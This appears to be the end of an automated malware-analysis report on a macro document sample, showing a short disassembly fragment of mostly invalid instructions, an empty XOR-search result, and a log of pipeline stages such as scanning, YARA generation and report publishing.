..
  │╎││││╎   ; DATA XREF from fcn.00000000 @ 0x31(r)
│ ││││└───> 0x00000086      c5             invalid
..
│ ││││ └──> 0x00000089  ~   b8181d1e0c     mov eax, 0xc1e1d18          ; '\x18\x1d\x1e\f'
│ ││└─────> 0x0000008a      181d1e0c272b   sbb byte [0x2b270cae], bl
│ ││ │      0x00000090      8f             invalid
..
│ ││ └────> 0x0000009a  ~   29a39aa38158   sub dword [rbx + 0x5881a39a], esp ; [0x5881a39a:4]=-1
│ └───────> 0x0000009d      a38158388f..   movabs dword [0xbb52b968f385881], eax ; [0xbb52b968f385881:4]=-1
└       │   0x000000a6      06             invalid
```

## XOR Search
{
  "xorsearch_ok": false,
  "sample": "/opt/samples/corpus/revai-lab-610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
  "candidates": [],
  "xorsearch_stdout": "",
  "xorsearch_stderr": "",
  "xorsearch_returncode": 1
}

## Audit Trail (recent)
- `{"source": "quick_scan_v2", "phase": 2, "ts": 1786291761.7701745}`
- `{"source": "agentic_recover_v4", "phase": "start", "ts": 1786291932.8045893}`
- `{"source": "yara_gen_v2", "ts": 1786291932.9768896}`
- `{"source": "publish_report_v2", "ts": 1786292089.0446172}`
- `{"source": "publish_report_v2_technical", "ts": 1786292220.4662569}`
